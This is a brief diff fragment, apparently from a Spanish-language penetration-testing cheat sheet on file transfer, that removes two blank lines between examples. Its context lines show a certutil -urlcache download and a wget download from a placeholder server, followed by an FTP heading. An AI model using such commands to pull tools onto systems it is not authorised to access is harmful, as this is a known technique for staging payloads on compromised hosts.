@@ -67,8 +67,6 @@ certutil.exe -urlcache -f http://<SERVER_IP>/file.txt file.txt
 
 wget http://<SERVER_IP>/file.txt
 ```
-
-
 ### FTP
 ```python
 #Servidor
